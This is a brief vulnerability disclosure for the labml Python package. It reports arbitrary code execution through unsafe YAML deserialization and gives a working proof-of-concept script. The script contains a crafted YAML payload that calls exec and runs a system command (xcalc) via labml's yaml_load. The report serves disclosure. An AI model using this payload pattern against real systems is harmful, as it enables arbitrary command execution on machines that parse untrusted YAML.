# Description

`labml` is an organize machine learning experiments and monitor training progress from mobile which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install labml
```

### Run exploit.py
```
import os
#os.system('pip install labml')
from labml.internal import util
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
util.yaml_load(exploit)
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
